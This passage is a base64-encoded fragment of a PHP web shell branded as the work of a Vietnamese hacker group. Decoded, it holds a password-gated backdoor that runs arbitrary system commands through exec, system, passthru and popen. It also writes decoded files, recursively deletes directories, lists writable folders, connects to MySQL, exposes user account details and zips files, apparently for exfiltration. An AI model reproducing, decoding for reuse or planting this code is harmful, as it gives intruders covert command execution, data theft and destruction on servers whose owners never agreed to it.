W90ZXNfZ3BjKScsJ25hbWUnPT4ncGhwdmFybmFtZScsJ3ZhbHVlJz0+JHBocHZhcm5hbWUsJ25ld2xpbmUnPT4xKSk7Cglmb3JtZm9vdGVyKCk7CgoJJGhwID0gYXJyYXkoMD0+ICdTZXJ2ZXInLCAxPT4gJ1BIUCcpOwoJZm9yKCRhPTA7JGE8MjskYSsrKSB7CgkJcCgnPGgyPicuJGhwWyRhXS4nICZyYXF1bzs8L2gyPicpOwoJCXAoJzx1bCBjbGFzcz0iaW5mbyI+Jyk7CgkJaWYgKCRhPT0wKSB7CgkJCWZvcigkaT0xOyRpPD05OyRpKyspIHsKCQkJCXAoJzxsaT48dT4nLiRpbmZvWyRpXVswXS4nOjwvdT4nLiRpbmZvWyRpXVsxXS4nPC9saT4nKTsKCQkJfQoJCX0gZWxzZWlmICgkYSA9PSAxKSB7CgkJCWZvcigkaT0xMDskaTw9MjM7JGkrKykgewoJCQkJcCgnPGxpPjx1PicuJGluZm9bJGldWzBdLic6PC91PicuJGluZm9bJGldWzFdLic8L2xpPicpOwoJCQl9CgkJfQoJCXAoJzwvdWw+Jyk7Cgl9Cn0vL2VuZCBwaHBlbnYKCmVsc2UgewoJbSgnVW5kZWZpbmVkIEFjdGlvbicpOwp9Cgo/Pgo8L3RkPjwvdHI+PC90YWJsZT4KPGRpdiBzdHlsZT0icGFkZGluZzoxMHB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICMwRTBFMEU7Ym9yZGVyLXRvcDoxcHggc29saWQgIzBFMEUwRTtiYWNrZ3JvdW5kOiMwRTBFMEU7Ij4KCTxzcGFuIHN0eWxlPSJmbG9hdDpyaWdodDsiPjw/cGhwIGRlYnVnaW5mbygpO29iX2VuZF9mbHVzaCgpOz8+PC9zcGFuPgoJQ29weXJpZ2h0IChDKSAyMDA0LTIwMTAgPEI+PC9CPiAtIERldmVsb3AgYnkgPGEgaHJlZj1odHRwOi8vYmV5ZXVncm91cC5jb20gdGFyZ2V0PV9ibGFuaz48Qj5CWUcgICA8L0I+PC9hPiAtIDxCPi0gVGhlIExlZ2VuZCBvZiBWaWV0bmFtZXNlIEhhY2tlciBXb3JsZDwvQj4gQWxsIFJpZ2h0cyBSZXNlcnZlZC4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgoKPD9waHAKCi8qPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09ClNob3cgaW5mbyBzaGVsbAo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0qLwoKZnVuY3Rpb24gbSgkbXNnKSB7CgllY2hvICc8ZGl2IHN0eWxlPSJiYWNrZ3JvdW5kOiNmMWYxZjE7Ym9yZGVyOjFweCBzb2xpZCAjZGRkO3BhZGRpbmc6MTVweDtmb250OjE0cHg7dGV4dC1hbGlnbjpjZW50ZXI7Zm9udC13ZWlnaHQ6Ym9sZDsiPic7CgllY2hvICRtc2c7CgllY2hvICc8L2Rpdj4nOwp9CmZ1bmN0aW9uIHNjb29raWUoJGtleSwgJHZhbHVlLCAkbGlmZSA9IDAsICRwcmVmaXggPSAxKSB7CglnbG9iYWwgJGFkbWluLCAkdGltZXN0YW1wLCAkX1NFUlZFUjsKCSRrZXkgPSAoJHByZWZpeCA/ICRhZG1pblsnY29va2llcHJlJ10gOiAnJykuJGtleTsKCSRsaWZlID0gJGxpZmUgPyAkbGlmZSA6ICRhZG1pblsnY29va2llbGlmZSddOwoJJHVzZXBvcnQgPSAkX1NFUlZFUlsnU0VSVkVSX1BPUlQnXSA9PSA0NDMgPyAxIDogMDsKCXNldGNvb2tpZSgka2V5LCAkdmFsdWUsICR0aW1lc3RhbXArJGxpZmUsICRhZG1pblsnY29va2llcGF0aCddLCAkYWRtaW5bJ2Nvb2tpZWRvbWFpbiddLCAkdXNlcG9ydCk7Cn0KZnVuY3Rpb24gbXVsdGkoJG51bSwgJHBlcnBhZ2UsICRjdXJwYWdlLCAkdGFibGVuYW1lKSB7CgkkbXVsdGlwYWdlID0gJyc7CglpZigkbnVtID4gJHBlcnBhZ2UpIHsKCQkkcGFnZSA9IDEwOwoJCSRvZmZzZXQgPSA1OwoJCSRwYWdlcyA9IEBjZWlsKCRudW0gLyAkcGVycGFnZSk7CgkJaWYoJHBhZ2UgPiAkcGFnZXMpIHsKCQkJJGZyb20gPSAxOwoJCQkkdG8gPSAkcGFnZXM7CgkJfSBlbHNlIHsKCQkJJGZyb20gPSAkY3VycGFnZSAtICRvZmZzZXQ7CgkJCSR0byA9ICRjdXJwYWdlICsgJHBhZ2UgLSAkb2Zmc2V0IC0gMTsKCQkJaWYoJGZyb20gPCAxKSB7CgkJCQkkdG8gPSAkY3VycGFnZSArIDEgLSAkZnJvbTsKCQkJCSRmcm9tID0gMTsKCQkJCWlmKCgkdG8gLSAkZnJvbSkgPCAkcGFnZSAmJiAoJHRvIC0gJGZyb20pIDwgJHBhZ2VzKSB7CgkJCQkJJHRvID0gJHBhZ2U7CgkJCQl9CgkJCX0gZWxzZWlmKCR0byA+ICRwYWdlcykgewoJCQkJJGZyb20gPSAkY3VycGFnZSAtICRwYWdlcyArICR0bzsKCQkJCSR0byA9ICRwYWdlczsKCQkJCWlmKCgkdG8gLSAkZnJvbSkgPCAkcGFnZSAmJiAoJHRvIC0gJGZyb20pIDwgJHBhZ2VzKSB7CgkJCQkJJGZyb20gPSAkcGFnZXMgLSAkcGFnZSArIDE7CgkJCQl9CgkJCX0KCQl9CgkJJG11bHRpcGFnZSA9ICgkY3VycGFnZSAtICRvZmZzZXQgPiAxICYmICRwYWdlcyA+ICRwYWdlID8gJzxhIGhyZWY9ImphdmFzY3JpcHQ6c2V0dGFibGUoXCcnLiR0YWJsZW5hbWUuJ1wnLCBcJ1wnLCAxKTsiPkZpcnN0PC9hPiAnIDogJycpLigkY3VycGFnZSA+IDEgPyAnPGEgaHJlZj0iamF2YXNjcmlwdDpzZXR0YWJsZShcJycuJHRhYmxlbmFtZS4nXCcsIFwnXCcsICcuKCRjdXJwYWdlIC0gMSkuJyk7Ij5QcmV2PC9hPiAnIDogJycpOwoJCWZvcigkaSA9ICRmcm9tOyAkaSA8PSAkdG87ICRpKyspIHsKCQkJJG11bHRpcGFnZSAuPSAkaSA9PSAkY3VycGFnZSA/ICRpLicgJyA6ICc8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdcJywgJy4kaS4nKTsiPlsnLiRpLiddPC9hPiAnOwoJCX0KCQkkbXVsdGlwYWdlIC49ICgkY3VycGFnZSA8ICRwYWdlcyA/ICc8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdcJywgJy4oJGN1cnBhZ2UgKyAxKS4nKTsiPk5leHQ8L2E+JyA6ICcnKS4oJHRvIDwgJHBhZ2VzID8gJyA8YSBocmVmPSJqYXZhc2NyaXB0OnNldHRhYmxlKFwnJy4kdGFibGVuYW1lLidcJywgXCdcJywgJy4kcGFnZXMuJyk7Ij5MYXN0PC9hPicgOiAnJyk7CgkJJG11bHRpcGFnZSA9ICRtdWx0aXBhZ2UgPyAnPHA+UGFnZXM6ICcuJG11bHRpcGFnZS4nPC9wPicgOiAnJzsKCX0KCXJldHVybiAkbXVsdGlwYWdlOwp9Ci8vIExvZ2luIHBhZ2UKZnVuY3Rpb24gbG9naW5wYWdlKCkgewo/Pgo8aHRtbD4KPGhlYWQ+Cgo8Ym9keSBiZ2NvbG9yPWJsYWNrIGJhY2tncm91bmQ9MS5qcGc+CgoJCTxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04IiAvPgo8dGl0bGU+QllHIC0gVGhlIExlZ2VuZCBvZiBWaWV0bmFtZXNlIEhhY2tlciBXb3JsZCA8L3RpdGxlPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpBOmxpbmsge3RleHQtZGVjb3JhdGlvbjogbm9uZTsgY29sb3I6IGdyZWVuIH0KQTp2aXNpdGVkIHt0ZXh0LWRlY29yYXRpb246IG5vbmU7Y29sb3I6cmVkfQpBOmFjdGl2ZSB7dGV4dC1kZWNvcmF0aW9uOiBub25lfQpBOmhvdmVyIHt0ZXh0LWRlY29yYXRpb246IHVuZGVybGluZTsgY29sb3I6IGdyZWVuO30KaW5wdXQsIHRleHRhcmVhLCBidXR0b24KewoJZm9udC1zaXplOiAxMXB0OwoJY29sb3I6IAkjRkZGRkZGOwoJZm9udC1mYW1pbHk6IHZlcmRhbmEsIHNhbnMtc2VyaWY7CgliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOwoJYm9yZGVyLWxlZnQ6IDJweCBkYXNoZWQgIzhCMDAwMDsKCWJvcmRlci10b3A6IDJweCBkYXNoZWQgIzhCMDAwMDsKCWJvcmRlci1yaWdodDogMnB4IGRhc2hlZCAjOEIwMDAwOwoJYm9yZGVyLWJvdHRvbTogMnB4IGRhc2hlZCAjOEIwMDAwOwp9Cgo8L3N0eWxlPgoKICAgICAgIDxCUj48QlI+CjxkaXYgYWxpZ249Y2VudGVyID4KCjxkaXY+Cjxmb250IGNvbG9yPWdyYXk+CjxiciAvPjxiciAvPjxiciAvPjxiciAvPjxiciAvPgoKPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249IiI+Cgk8c3BhbiBzdHlsZT0iZm9udDoyMHB0IHRhaG9tYTsiPiA8L3NwYW4+PGlucHV0IG5hbWU9InBhc3N3b3JkIiB0eXBlPSJwYXNzd29yZCIgc2l6ZT0iMzAiPgoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZG9pbmciIHZhbHVlPSJsb2dpbiI+Cgk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iTG9naW4iPgoJPC9mb3JtPgo8QlI+Cjw/cGhwCmVjaG8gIiIuJGVycl9tZXNzLiIiOwo/PgoKCTxCPjxmb250IGNvbG9yPXJlZD4KCgoKCgoKPC9kaXY+CgoKCTwvZmllbGRzZXQ+CgoKCjwvaGVhZD4KPC9odG1sPgoKCjw/cGhwCglleGl0OwoKfS8vZW5kIGxvZ2lucGFnZSgpCgpmdW5jdGlvbiBleGVjdXRlKCRjZmUpIHsKCSRyZXMgPSAnJzsKCWlmICgkY2ZlKSB7CgkJaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpIHsKCQkJQGV4ZWMoJGNmZSwkcmVzKTsKCQkJJHJlcyA9IGpvaW4oIlxuIiwkcmVzKTsKCQl9IGVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3NoZWxsX2V4ZWMnKSkgewoJCQkkcmVzID0gQHNoZWxsX2V4ZWMoJGNmZSk7CgkJfSBlbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzeXN0ZW0nKSkgewoJCQlAb2Jfc3RhcnQoKTsKCQkJQHN5c3RlbSgkY2ZlKTsKCQkJJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsKCQkJQG9iX2VuZF9jbGVhbigpOwoJCX0gZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygncGFzc3RocnUnKSkgewoJCQlAb2Jfc3RhcnQoKTsKCQkJQHBhc3N0aHJ1KCRjZmUpOwoJCQkkcmVzID0gQG9iX2dldF9jb250ZW50cygpOwoJCQlAb2JfZW5kX2NsZWFuKCk7CgkJfSBlbHNlaWYoQGlzX3Jlc291cmNlKCRmID0gQHBvcGVuKCRjZmUsInIiKSkpIHsKCQkJJHJlcyA9ICcnOwoJCQl3aGlsZSghQGZlb2YoJGYpKSB7CgkJCQkkcmVzIC49IEBmcmVhZCgkZiwxMDI0KTsKCQkJfQoJCQlAcGNsb3NlKCRmKTsKCQl9Cgl9CglyZXR1cm4gJHJlczsKfQpmdW5jdGlvbiB3aGljaCgkcHIpIHsKCSRwYXRoID0gZXhlY3V0ZSgid2hpY2ggJHByIik7CglyZXR1cm4gKCRwYXRoID8gJHBhdGggOiAkcHIpOwp9CgpmdW5jdGlvbiBjZigkZm5hbWUsJHRleHQpewoJaWYoJGZwPUBmb3BlbigkZm5hbWUsJ3cnKSkgewoJCUBmcHV0cygkZnAsQGJhc2U2NF9kZWNvZGUoJHRleHQpKTsKCQlAZmNsb3NlKCRmcCk7Cgl9Cn0KCi8vIERlYnVnCmZ1bmN0aW9uIGRlYnVnaW5mbygpIHsKCWdsb2JhbCAkc3RhcnR0aW1lOwoJJG10aW1lID0gZXhwbG9kZSgnICcsIG1pY3JvdGltZSgpKTsKCSR0b3RhbHRpbWUgPSBudW1iZXJfZm9ybWF0KCgkbXRpbWVbMV0gKyAkbXRpbWVbMF0gLSAkc3RhcnR0aW1lKSwgNik7CgllY2hvICdQcm9jZXNzZWQgaW4gJy4kdG90YWx0aW1lLicgc2Vjb25kKHMpJzsKfQoKLy8gRnVuY3Rpb24gY29ubmVjdCBkYXRhYmFzZQpmdW5jdGlvbiBkYmNvbm4oJGRiaG9zdCwkZGJ1c2VyLCRkYnBhc3MsJGRibmFtZT0nJywkY2hhcnNldD0nJywkZGJwb3J0PSczMzA2JykgewoJaWYoISRsaW5rID0gQG15c3FsX2Nvbm5lY3QoJGRiaG9zdC4nOicuJGRicG9ydCwgJGRidXNlciwgJGRicGFzcykpIHsKCQlwKCc8aDI+Q2FuIG5vdCBjb25uZWN0IHRvIE15U1FMIHNlcnZlcjwvaDI+Jyk7CgkJZXhpdDsKCX0KCWlmKCRsaW5rICYmICRkYm5hbWUpIHsKCQlpZiAoIUBteXNxbF9zZWxlY3RfZGIoJGRibmFtZSwgJGxpbmspKSB7CgkJCXAoJzxoMj5EYXRhYmFzZSBzZWxlY3RlZCBoYXMgZXJyb3I8L2gyPicpOwoJCQlleGl0OwoJCX0KCX0KCWlmKCRsaW5rICYmIG15c3FsX2dldF9zZXJ2ZXJfaW5mbygpID4gJzQuMScpIHsKCQlpZihpbl9hcnJheShzdHJ0b2xvd2VyKCRjaGFyc2V0KSwgYXJyYXkoJ2diaycsICdiaWc1JywgJ3V0ZjgnKSkpIHsKCQkJcSgiU0VUIGNoYXJhY3Rlcl9zZXRfY29ubmVjdGlvbj0kY2hhcnNldCwgY2hhcmFjdGVyX3NldF9yZXN1bHRzPSRjaGFyc2V0LCBjaGFyYWN0ZXJfc2V0X2NsaWVudD1iaW5hcnk7IiwgJGxpbmspOwoJCX0KCX0KCXJldHVybiAkbGluazsKfQoKLy8gQXJyYXkgc3RyaXAKZnVuY3Rpb24gc19hcnJheSgmJGFycmF5KSB7CglpZiAoaXNfYXJyYXkoJGFycmF5KSkgewoJCWZvcmVhY2ggKCRhcnJheSBhcyAkayA9PiAkdikgewoJCQkkYXJyYXlbJGtdID0gc19hcnJheSgkdik7CgkJfQoJfSBlbHNlIGlmIChpc19zdHJpbmcoJGFycmF5KSkgewoJCSRhcnJheSA9IHN0cmlwc2xhc2hlcygkYXJyYXkpOwoJfQoJcmV0dXJuICRhcnJheTsKfQoKLy8gSFRNTCBTdHJpcApmdW5jdGlvbiBodG1sX2NsZWFuKCRjb250ZW50KSB7CgkkY29udGVudCA9IGh0bWxzcGVjaWFsY2hhcnMoJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiXG4iLCAiPGJyIC8+IiwgJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiICAiLCAiJm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOwoJJGNvbnRlbnQgPSBzdHJfcmVwbGFjZSgiXHQiLCAiJm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7IiwgJGNvbnRlbnQpOwoJcmV0dXJuICRjb250ZW50Owp9CgovLyBDaG1vZApmdW5jdGlvbiBnZXRDaG1vZCgkZmlsZXBhdGgpewoJcmV0dXJuIHN1YnN0cihiYXNlX2NvbnZlcnQoQGZpbGVwZXJtcygkZmlsZXBhdGgpLDEwLDgpLC00KTsKfQoKZnVuY3Rpb24gZ2V0UGVybXMoJGZpbGVwYXRoKSB7CgkkbW9kZSA9IEBmaWxlcGVybXMoJGZpbGVwYXRoKTsKCWlmICgoJG1vZGUgJiAweEMwMDApID09PSAweEMwMDApIHskdHlwZSA9ICdzJzt9CgllbHNlaWYgKCgkbW9kZSAmIDB4NDAwMCkgPT09IDB4NDAwMCkgeyR0eXBlID0gJ2QnO30KCWVsc2VpZiAoKCRtb2RlICYgMHhBMDAwKSA9PT0gMHhBMDAwKSB7JHR5cGUgPSAnbCc7fQoJZWxzZWlmICgoJG1vZGUgJiAweDgwMDApID09PSAweDgwMDApIHskdHlwZSA9ICctJzt9CgllbHNlaWYgKCgkbW9kZSAmIDB4NjAwMCkgPT09IDB4NjAwMCkgeyR0eXBlID0gJ2InO30KCWVsc2VpZiAoKCRtb2RlICYgMHgyMDAwKSA9PT0gMHgyMDAwKSB7JHR5cGUgPSAnYyc7fQoJZWxzZWlmICgoJG1vZGUgJiAweDEwMDApID09PSAweDEwMDApIHskdHlwZSA9ICdwJzt9CgllbHNlIHskdHlwZSA9ICc/Jzt9CgoJJG93bmVyWydyZWFkJ10gPSAoJG1vZGUgJiAwMDQwMCkgPyAncicgOiAnLSc7Cgkkb3duZXJbJ3dyaXRlJ10gPSAoJG1vZGUgJiAwMDIwMCkgPyAndycgOiAnLSc7Cgkkb3duZXJbJ2V4ZWN1dGUnXSA9ICgkbW9kZSAmIDAwMTAwKSA/ICd4JyA6ICctJzsKCSRncm91cFsncmVhZCddID0gKCRtb2RlICYgMDAwNDApID8gJ3InIDogJy0nOwoJJGdyb3VwWyd3cml0ZSddID0gKCRtb2RlICYgMDAwMjApID8gJ3cnIDogJy0nOwoJJGdyb3VwWydleGVjdXRlJ10gPSAoJG1vZGUgJiAwMDAxMCkgPyAneCcgOiAnLSc7Cgkkd29ybGRbJ3JlYWQnXSA9ICgkbW9kZSAmIDAwMDA0KSA/ICdyJyA6ICctJzsKCSR3b3JsZFsnd3JpdGUnXSA9ICgkbW9kZSAmIDAwMDAyKSA/ICd3JyA6ICctJzsKCSR3b3JsZFsnZXhlY3V0ZSddID0gKCRtb2RlICYgMDAwMDEpID8gJ3gnIDogJy0nOwoKCWlmKCAkbW9kZSAmIDB4ODAwICkgeyRvd25lclsnZXhlY3V0ZSddID0gKCRvd25lclsnZXhlY3V0ZSddPT0neCcpID8gJ3MnIDogJ1MnO30KCWlmKCAkbW9kZSAmIDB4NDAwICkgeyRncm91cFsnZXhlY3V0ZSddID0gKCRncm91cFsnZXhlY3V0ZSddPT0neCcpID8gJ3MnIDogJ1MnO30KCWlmKCAkbW9kZSAmIDB4MjAwICkgeyR3b3JsZFsnZXhlY3V0ZSddID0gKCR3b3JsZFsnZXhlY3V0ZSddPT0neCcpID8gJ3QnIDogJ1QnO30KCglyZXR1cm4gJHR5cGUuJG93bmVyWydyZWFkJ10uJG93bmVyWyd3cml0ZSddLiRvd25lclsnZXhlY3V0ZSddLiRncm91cFsncmVhZCddLiRncm91cFsnd3JpdGUnXS4kZ3JvdXBbJ2V4ZWN1dGUnXS4kd29ybGRbJ3JlYWQnXS4kd29ybGRbJ3dyaXRlJ10uJHdvcmxkWydleGVjdXRlJ107Cn0KCmZ1bmN0aW9uIGdldFVzZXIoJGZpbGVwYXRoKQl7CglpZiAoZnVuY3Rpb25fZXhpc3RzKCdwb3NpeF9nZXRwd3VpZCcpKSB7CgkJJGFycmF5ID0gQHBvc2l4X2dldHB3dWlkKEBmaWxlb3duZXIoJGZpbGVwYXRoKSk7CgkJaWYgKCRhcnJheSAmJiBpc19hcnJheSgkYXJyYXkpKSB7CgkJCXJldHVybiAnIC8gPGEgaHJlZj0iIyIgdGl0bGU9IlVzZXI6ICcuJGFycmF5WyduYW1lJ10uJyYjMTMmIzEwUGFzc3dkOiAnLiRhcnJheVsncGFzc3dkJ10uJyYjMTMmIzEwVWlkOiAnLiRhcnJheVsndWlkJ10uJyYjMTMmIzEwZ2lkOiAnLiRhcnJheVsnZ2lkJ10uJyYjMTMmIzEwR2Vjb3M6ICcuJGFycmF5WydnZWNvcyddLicmIzEzJiMxMERpcjogJy4kYXJyYXlbJ2RpciddLicmIzEzJiMxMFNoZWxsOiAnLiRhcnJheVsnc2hlbGwnXS4nIj4nLiRhcnJheVsnbmFtZSddLic8L2E+JzsKCQl9Cgl9CglyZXR1cm4gJyc7Cn0KCi8vIERlbGV0ZSBkaXIKZnVuY3Rpb24gZGVsdHJlZSgkZGVsZGlyKSB7CgkkbXlkaXI9QGRpcigkZGVsZGlyKTsKCXdoaWxlKCRmaWxlPSRteWRpci0+cmVhZCgpKQl7CgkJaWYoKGlzX2RpcigkZGVsZGlyLicvJy4kZmlsZSkpICYmICgkZmlsZSE9Jy4nKSAmJiAoJGZpbGUhPScuLicpKSB7CgkJCUBjaG1vZCgkZGVsZGlyLicvJy4kZmlsZSwwNzc3KTsKCQkJZGVsdHJlZSgkZGVsZGlyLicvJy4kZmlsZSk7CgkJfQoJCWlmIChpc19maWxlKCRkZWxkaXIuJy8nLiRmaWxlKSkgewoJCQlAY2htb2QoJGRlbGRpci4nLycuJGZpbGUsMDc3Nyk7CgkJCUB1bmxpbmsoJGRlbGRpci4nLycuJGZpbGUpOwoJCX0KCX0KCSRteWRpci0+Y2xvc2UoKTsKCUBjaG1vZCgkZGVsZGlyLDA3NzcpOwoJcmV0dXJuIEBybWRpcigkZGVsZGlyKSA/IDEgOiAwOwp9CgovLyBCYWNrZ3JvdW5kCmZ1bmN0aW9uIGJnKCkgewoJZ2xvYmFsICRiZ2M7CglyZXR1cm4gKCRiZ2MrKyUyPT0wKSA/ICdhbHQxJyA6ICdhbHQyJzsKfQoKLy8gR2V0IHBhdGgKZnVuY3Rpb24gZ2V0UGF0aCgkc2NyaXB0cGF0aCwgJG5vd3BhdGgpIHsKCWlmICgkbm93cGF0aCA9PSAnLicpIHsKCQkkbm93cGF0aCA9ICRzY3JpcHRwYXRoOwoJfQoJJG5vd3BhdGggPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRub3dwYXRoKTsKCSRub3dwYXRoID0gc3RyX3JlcGxhY2UoJy8vJywgJy8nLCAkbm93cGF0aCk7CglpZiAoc3Vic3RyKCRub3dwYXRoLCAtMSkgIT0gJy8nKSB7CgkJJG5vd3BhdGggPSAkbm93cGF0aC4nLyc7Cgl9CglyZXR1cm4gJG5vd3BhdGg7Cn0KCi8vIEdldCB1cCBwYXRoCmZ1bmN0aW9uIGdldFVwUGF0aCgkbm93cGF0aCkgewoJJHBhdGhkYiA9IGV4cGxvZGUoJy8nLCAkbm93cGF0aCk7CgkkbnVtID0gY291bnQoJHBhdGhkYik7CglpZiAoJG51bSA+IDIpIHsKCQl1bnNldCgkcGF0aGRiWyRudW0tMV0sJHBhdGhkYlskbnVtLTJdKTsKCX0KCSR1cHBhdGggPSBpbXBsb2RlKCcvJywgJHBhdGhkYikuJy8nOwoJJHVwcGF0aCA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJHVwcGF0aCk7CglyZXR1cm4gJHVwcGF0aDsKfQoKLy8gQ29uZmlnCmZ1bmN0aW9uIGdldGNmZygkdmFybmFtZSkgewoJJHJlc3VsdCA9IGdldF9jZmdfdmFyKCR2YXJuYW1lKTsKCWlmICgkcmVzdWx0ID09IDApIHsKCQlyZXR1cm4gJ05vJzsKCX0gZWxzZWlmICgkcmVzdWx0ID09IDEpIHsKCQlyZXR1cm4gJ1llcyc7Cgl9IGVsc2UgewoJCXJldHVybiAkcmVzdWx0OwoJfQp9CgovLyBGdW5jdGlvbiBuYW1lCmZ1bmN0aW9uIGdldGZ1bigkZnVuTmFtZSkgewoJcmV0dXJuIChmYWxzZSAhPT0gZnVuY3Rpb25fZXhpc3RzKCRmdW5OYW1lKSkgPyAnWWVzJyA6ICdObyc7Cn0KCmZ1bmN0aW9uIEdldExpc3QoJGRpcil7CglnbG9iYWwgJGRpcmRhdGEsJGosJG5vd3BhdGg7CgkhJGogJiYgJGo9MTsKCWlmICgkZGggPSBvcGVuZGlyKCRkaXIpKSB7CgkJd2hpbGUgKCRmaWxlID0gcmVhZGRpcigkZGgpKSB7CgkJCSRmPXN0cl9yZXBsYWNlKCcvLycsJy8nLCRkaXIuJy8nLiRmaWxlKTsKCQkJaWYoJGZpbGUhPScuJyAmJiAkZmlsZSE9Jy4uJyAmJiBpc19kaXIoJGYpKXsKCQkJCWlmIChpc193cml0YWJsZSgkZikpIHsKCQkJCQkkZGlyZGF0YVskal1bJ2ZpbGVuYW1lJ109c3RyX3JlcGxhY2UoJG5vd3BhdGgsJycsJGYpOwoJCQkJCSRkaXJkYXRhWyRqXVsnbXRpbWUnXT1AZGF0ZSgnWS1tLWQgSDppOnMnLGZpbGVtdGltZSgkZikpOwoJCQkJCSRkaXJkYXRhWyRqXVsnZGlyY2htb2QnXT1nZXRDaG1vZCgkZik7CgkJCQkJJGRpcmRhdGFbJGpdWydkaXJwZXJtJ109Z2V0UGVybXMoJGYpOwoJCQkJCSRkaXJkYXRhWyRqXVsnZGlybGluayddPXVlKCRkaXIpOwoJCQkJCSRkaXJkYXRhWyRqXVsnc2VydmVyX2xpbmsnXT0kZjsKCQkJCQkkZGlyZGF0YVskal1bJ2NsaWVudF9saW5rJ109dWUoJGYpOwoJCQkJCSRqKys7CgkJCQl9CgkJCQlHZXRMaXN0KCRmKTsKCQkJfQoJCX0KCQljbG9zZWRpcigkZGgpOwoJCWNsZWFyc3RhdGNhY2hlKCk7CgkJcmV0dXJuICRkaXJkYXRhOwoJfSBlbHNlIHsKCQlyZXR1cm4gYXJyYXkoKTsKCX0KfQoKZnVuY3Rpb24gcXkoJHNxbCkgewoJLy9lY2hvICRzcWwuJzxicj4nOwoJJHJlcyA9ICRlcnJvciA9ICcnOwoJaWYoISRyZXMgPSBAbXlzcWxfcXVlcnkoJHNxbCkpIHsKCQlyZXR1cm4gMDsKCX0gZWxzZSBpZihpc19yZXNvdXJjZSgkcmVzKSkgewoJCXJldHVybiAxOwoJfSBlbHNlIHsKCQlyZXR1cm4gMjsKCX0KCXJldHVybiAwOwp9CgpmdW5jdGlvbiBxKCRzcWwpIHsKCXJldHVybiBAbXlzcWxfcXVlcnkoJHNxbCk7Cn0KCmZ1bmN0aW9uIGZyKCRxeSl7CglteXNxbF9mcmVlX3Jlc3VsdCgkcXkpOwp9CgpmdW5jdGlvbiBzaXplY291bnQoJHNpemUpIHsKCWlmKCRzaXplID4gMTA3Mzc0MTgyNCkgewoJCSRzaXplID0gcm91bmQoJHNpemUgLyAxMDczNzQxODI0ICogMTAwKSAvIDEwMCAuICcgRyc7Cgl9IGVsc2VpZigkc2l6ZSA+IDEwNDg1NzYpIHsKCQkkc2l6ZSA9IHJvdW5kKCRzaXplIC8gMTA0ODU3NiAqIDEwMCkgLyAxMDAgLiAnIE0nOwoJfSBlbHNlaWYoJHNpemUgPiAxMDI0KSB7CgkJJHNpemUgPSByb3VuZCgkc2l6ZSAvIDEwMjQgKiAxMDApIC8gMTAwIC4gJyBLJzsKCX0gZWxzZSB7CgkJJHNpemUgPSAkc2l6ZSAuICcgQic7Cgl9CglyZXR1cm4gJHNpemU7Cn0KCi8vIFppcApjbGFzcyBQSFBaaXB7Cgl2YXIgJG91dD0nJzsKCWZ1bmN0aW9uIFBIUFppcCgkZGlyKQl7CgkJaWYgKEBmdW5jdGlvbl9leGlzdHMoJ2d6Y29tcHJlc3MnKSkJewoJCQkkY3VyZGlyID0gZ2V0Y3dkKCk7CgkJCWlmIChpc19hcnJheSgkZGlyKSkgJGZpbGVsaXN0ID0gJGRpcjsKCQkJZWxzZXsKCQkJCSRmaWxlbGlzdD0kdGhpcyAtPiBHZXRGaWxlTGlzdCgkZGlyKTsvL0ZpbGUgbGlzdAoJCQkJZm9yZWFjaCgkZmlsZWxpc3QgYXMgJGs9PiR2KSAkZmlsZWxpc3RbXT1zdWJzdHIoJHYsc3RybGVuKCRkaXIpKzEpOwoJCQl9CgkJCWlmICgoIWVtcHR5KCRkaXIpKSYmKCFpc19hcnJheSgkZGlyKSkmJihmaWxlX2V4aXN0cygkZGlyKSkpIGNoZGlyKCRkaXIpOwoJCQllbHNlIGNoZGlyKCRjdXJkaXIpOwoJCQlpZiAoY291bnQoJGZpbGVsaXN0KT4wKXsKCQkJCWZvcmVhY2goJGZpbGVsaXN0IGFzICRmaWxlbmFtZSl7CgkJCQkJaWYgKGlzX2ZpbGUoJGZpbGVuYW1lKSl7CgkJCQkJCSRmZCA9IGZvcGVuICgkZmlsZW5hbWUsICdyJyk7CgkJCQkJCSRjb250ZW50ID0gQGZyZWFkICgkZmQsIGZpbGVzaXplKCRmaWxlbmFtZSkpOwoJCQkJCQlmY2xvc2UgKCRmZCk7CgkJCQkJCWlmIChpc19hcnJheSgkZGlyKSkgJGZpbGVuYW1lID0gYmFzZW5hbWUoJGZpbGVuYW1lKTsKCQkJCQkJJHRoaXMgLT4gYWRkRmlsZSgkY29udGVudCwgJGZpbGVuYW1lKTsKCQkJCQl9CgkJCQl9CgkJCQkkdGhpcy0+b3V0ID0gJHRoaXMgLT4gZmlsZSgpOwoJCQkJY2hkaXIoJGN1cmRpcik7CgkJCX0KCQkJcmV0dXJuIDE7CgkJfQoJCWVsc2UgcmV0dXJuIDA7Cgl9CgoJLy8gU2hvdyBmaWxlIGxpc3QKCWZ1bmN0aW9uIEdldEZpbGVMaXN0KCRkaXIpewoJCXN0YXRpYyAkYTsKCQlpZiAoaXNfZGlyKCRkaXIpKSB7CgkJCWlmICgkZGggPSBvcGVuZGlyKCRkaXIpKSB7CgkJC